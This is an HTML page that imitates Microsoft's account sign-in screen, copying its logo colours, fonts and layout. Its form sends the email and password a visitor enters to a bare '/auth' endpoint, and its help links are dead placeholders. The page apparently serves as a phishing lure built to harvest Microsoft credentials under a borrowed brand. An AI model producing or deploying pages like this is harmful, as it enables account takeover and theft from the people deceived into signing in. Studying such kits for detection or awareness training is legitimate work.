<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your Microsoft account</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f2f2f2; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background: white; padding: 44px; width: 100%; max-width: 400px; box-shadow: 0 2px 6px rgba(0,0,0,0.1); box-sizing: border-box; }
        .logo { font-size: 24px; font-weight: 600; color: #5e5e5e; margin-bottom: 20px; }
        .logo span { color: #f25022; } .logo span:nth-child(2) { color: #7fba00; } .logo span:nth-child(3) { color: #00a4ef; } .logo span:nth-child(4) { color: #ffb900; }
        h2 { font-size: 24px; font-weight: 600; margin-bottom: 20px; color: #1b1b1b; }
        input { width: 100%; padding: 10px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; font-size: 15px; }
        input:focus { outline: none; border-color: #0067b8; }
        .btn { background-color: #0067b8; color: white; padding: 10px 20px; border: none; border-radius: 4px; font-size: 15px; cursor: pointer; width: 100%; font-weight: 600; }
        .btn:hover { background-color: #005da6; }
        .links { margin-top: 20px; font-size: 13px; color: #0067b8; }
        .links a { text-decoration: none; color: #0067b8; display: block; margin-bottom: 8px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <span>■</span><span>■</span><span>■</span><span>■</span> Microsoft
        </div>
        <h2>Sign in</h2>
        <form action="/auth" method="POST">
            <input type="email" name="email" placeholder="Email, phone, or Skype" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit" class="btn">Next</button>
        </form>
        <div class="links">
            <a href="#">No account? Create one!</a>
            <a href="#">Forgot password?</a>
        </div>
    </div>
</body>
</html>
